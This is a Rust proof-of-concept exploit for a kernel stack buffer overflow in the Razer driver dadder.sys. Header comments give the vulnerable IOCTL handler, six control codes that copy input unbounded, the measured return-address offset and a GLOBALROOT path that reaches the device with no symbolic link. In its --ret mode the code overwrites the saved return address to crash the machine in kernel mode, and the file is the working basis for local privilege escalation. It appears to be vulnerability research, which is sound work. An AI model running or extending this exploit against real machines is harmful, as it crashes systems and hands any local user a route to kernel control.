//! dadder.sys (Razer) - kernel stack buffer overflow reachable by any local user.
//!
//! SHA-256 2e540b2d6b75e23dc776df3e7a65cc9461131ec053a77862da2bc4306e5c05cb
//!
//! The IRP_MJ_DEVICE_CONTROL handler at RVA 0x790 opens:
//!
//!     push rbx / rsi / rdi / r12 / r13 / r14   ; six registers
//!     sub  rsp, 438h                            ; the frame
//!
//! Six handlers then copy the caller's input into a stack buffer (loaded as
//! lea rcx,[rsp+48h]) using the caller's own InputBufferLength as the size:
//!
//!     puVar9 = *(undefined2 **)(param_2 + 0x18);   /* SystemBuffer      */
//!     uVar10 = *(undefined4 *)(lVar4 + 0x10);      /* InputBufferLength */
//!     if (puVar9 != NULL) {
//!         RtlCopyMemory(&uStack_438, puVar9, uVar10);
//!
//! Only the pointer is checked. The return-address offset was measured on the
//! test machine rather than derived by hand: a run that filled the input so that
//! the qword at byte offset N held (0x00007FFF00000000 | N) produced a bug check
//! whose faulting address was exactly 0x00007FFF00000438, so:
//!
//!     input offset 0x438  the return address
//!     input offset 0x408 .. 0x430  the six saved registers
//!
//! DriverEntry creates \Device\dadder and never calls IoCreateSymbolicLink, so
//! \\.\dadder does not resolve. The object namespace reaches it anyway.
//!
//! Modes:
//!     --baseline   send 0x400 bytes, which fits below the saved registers.
//!                  Machine unaffected.
//!     --ret        send 0x440 bytes, replacing the return address with an
//!                  unmapped marker. The machine stops with that as the faulting
//!                  address, in kernel mode.
//!     --profile    send 0x480 offset-encoded bytes; the dump's registers then
//!                  reveal the exact offset that reached each. This is how the
//!                  0x438 figure above was established.
//!
//! Build:  rustc -O dadder_overflow.rs -o dadder_overflow.exe

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

const DEVICE: &str = r"\\?\GLOBALROOT\Device\dadder";
const CONTROL: &str = r"\\?\GLOBALROOT\Device\dz_absent_control_0000";

/// The six control codes whose handler performs the unbounded copy.
const CODES: [u32; 6] = [
    0x0022_2498, 0x0022_24A0, 0x0022_24A8, 0x0022_24B8, 0x0022_2520, 0x0022_2528,
];

const BUFFER: usize = 0x400; // largest input that stays below the saved registers
const RET_AT: usize = 0x438; // measured, see header
const RIP_MARKER: u64 = 0x0000_7FFF_0000_DEAD;

const GENERIC_RW: u32 = 0xC000_0000;
const OPEN_EXISTING: u32 = 3;
const INVALID_HANDLE: isize = -1;

#[link(name = "kernel32")]
unsafe extern "system" {
    fn CreateFileW(n: *const u16, a: u32, s: u32, sa: *mut u8, d: u32, f: u32, t: isize) -> isize;
    fn DeviceIoControl(h: isize, code: u32, inb: *const u8, inl: u32, outb: *mut u8, outl: u32,
                       ret: *mut u32, ov: *mut u8) -> i32;
    fn CloseHandle(h: isize) -> i32;
    fn GetLastError() -> u32;
}

fn wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

fn open(path: &str) -> Result<isize, u32> {
    let h = unsafe {
        CreateFileW(wide(path).as_ptr(), GENERIC_RW, 0, ptr::null_mut(), OPEN_EXISTING, 0, 0)
    };
    if h == INVALID_HANDLE || h == 0 { Err(unsafe { GetLastError() }) } else { Ok(h) }
}

fn send(handle: isize, code: u32, input: &[u8]) -> (bool, u32) {
    let mut out = [0u8; 64];
    let mut returned = 0u32;
    let ok = unsafe {
        DeviceIoControl(handle, code, input.as_ptr(), input.len() as u32,
                        out.as_mut_ptr(), out.len() as u32, &mut returned, ptr::null_mut())
    } != 0;
    (ok, if ok { 0 } else { unsafe { GetLastError() } })
}

fn main() {
    let mode = std::env::args().nth(1).unwrap_or_else(|| "--baseline".into());

    if open(CONTROL).is_ok() {
        eprintln!("a device name that cannot exist opened; results here would be meaningless");
        std::process::exit(2);
    }

    let handle = match open(DEVICE) {
        Ok(h) => h,
        Err(e) => {
            eprintln!("cannot open {DEVICE}: win32 error {e}");
            eprintln!("the driver must be loaded. it publishes no \\DosDevices link,");
            eprintln!("so the object namespace path above is the way in.");
            std::process::exit(1);
        }
    };
    let who = std::env::var("USERNAME").unwrap_or_else(|_| "unknown".into());
    println!("opened {DEVICE} as {who}");
    println!("the return address is at input offset 0x{RET_AT:X}");
    println!();

    let code = CODES[0];
    match mode.as_str() {
        "--baseline" => {
            let (ok, err) = send(handle, code, &vec![0x41u8; BUFFER]);
            println!("ioctl 0x{code:08X}, 0x{BUFFER:X} bytes: accepted={ok} error={err}");
            println!("that stays below the saved registers; the machine is unaffected.");
        }
        "--ret" => {
            let mut input = vec![0x41u8; RET_AT + 8];
            input[RET_AT..RET_AT + 8].copy_from_slice(&RIP_MARKER.to_le_bytes());
            println!("sending 0x{:X} bytes to ioctl 0x{code:08X}", input.len());
            println!("  offset 0x{RET_AT:03X} -> the return address = 0x{RIP_MARKER:016X}");
            println!("  the machine is expected to stop here");
            let (ok, err) = send(handle, code, &input);
            println!("still running: accepted={ok} error={err} - the overwrite had no effect");
        }
        "--profile" => {
            let len = 0x480usize;
            let mut input = vec![0u8; len];
            let mut off = 0;
            while off + 8 <= len {
                let v: u64 = 0x0000_7FFF_0000_0000 | (off as u64);
                input[off..off + 8].copy_from_slice(&v.to_le_bytes());
                off += 8;
            }
            println!("sending 0x{len:X} offset-encoded bytes to 0x{code:08X}");
            println!("each register in the dump then reveals, in its low bytes, the input");
            println!("offset that reached it; the return address came from offset 0x{RET_AT:X}");
            let (ok, err) = send(handle, code, &input);
            println!("still running: accepted={ok} error={err}");
        }
        other => {
            eprintln!("unknown mode {other}; use --baseline, --ret or --profile");
            std::process::exit(2);
        }
    }

    unsafe { CloseHandle(handle) };
}
